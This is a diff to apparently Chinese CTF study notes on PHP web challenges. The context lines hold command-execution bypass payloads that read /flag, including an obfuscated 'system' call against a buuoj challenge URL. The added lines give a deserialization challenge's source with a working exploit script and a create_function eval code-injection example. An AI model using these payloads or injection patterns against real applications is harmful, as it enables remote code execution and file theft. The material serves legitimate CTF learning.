@@ -54,7 +54,7 @@ burp抓包在Content-Length下一行，不加空行, 将1:cat /flag作为header�
 Content-Length: 11
 1: cat /flag
 
-exec(getallheaders(){1}) //操作xx和yy，中间用逗号隔开，echo都能输出 echo xx,yy
+exec(getallheaders(){1}) //操作xx和yy 对应cat /flag，中间用逗号隔开，echo都能输出 echo xx,yy
 
 方法3: 强制传参
 exp=cat /flag&abs=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){abs}($$pi{exp})
@@ -96,6 +96,127 @@ for($k=1;$k<=sizeof($payload);$k++){
 `http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`
 
 
+
+# php 反序列化
+## [第五空间 2021]pklovecloud
+```php
+<?php
+//include 'flag.php';
+class pkshow
+{
+    function echo_name()
+    {
+        return "Pk very safe^.^";
+    }
+}
+
+class acp
+{
+    protected $cinder;
+    public $neutron;
+    public $nova;
+    function __construct()
+    {
+        $this->cinder = new pkshow;
+    }
+    function __toString()
+    {
+        if (isset($this->cinder))
+            return $this->cinder->echo_name();
+    }
+}
+
+class ace
+{
+    public $filename;
+    public $openstack;
+    public $docker;
+    function echo_name()
+    {
+        $this->openstack = unserialize($this->docker);
+        $this->openstack->neutron = $heat;
+        if($this->openstack->neutron === $this->openstack->nova)
+        {
+            $file = "./{$this->filename}";
+            if (file_get_contents($file))
+            {
+                return file_get_contents($file);
+            }
+            else
+            {
+                return "keystone lost~";
+            }
+        }
+    }
+}
+
+if (isset($_GET['pks']))
+{
+    $logData = unserialize($_GET['pks']);
+    echo $logData;
+}
+else
+{
+    highlight_file(__file__);
+}
+?>
+```
+
+exp
+
+```php
+<?php
+
+class acp
+{
+    protected $cinder;
+    public $neutron;
+    public $nova;
+    function __construct($cinder){
+        $this->nova = &$this->neutron;
+        $this->cinder = $cinder;
+    }
+}
+
+class ace
+{
+    public $filename = "flag.php";
+    public $docker;
+    function __construct($docker){
+        $this->docker = $docker;
+    }
+}
+
+echo urlencode(serialize(new acp(new ace(serialize(new acp(""))))));
+
+//$b = serialize(new acp(""));
+//$c = new ace($b);
+//$d = new acp($c);
+//echo urlencode(serialize($d));
+```
+# 执行漏洞
+
+## 2020BJDCTF “EzPHP”
+https://www.gem-love.com/ctf/770.html
+
+```php
+<?php
+$myFunc = create_function('$a', '$b', 'return($a+$b);')
+print_r($myFunc(1,2));
+```
+
+实际上 myFunc() 就相当于:
+```php
+function myFunc($a, $b){
+    return $a+$b;
+}
+```
+
+这看似正常，实则充满危险。由于 $code 可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
+```php
+<?php
+$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_GET[\'c\']);//');
+```
 
 # SSTI
 
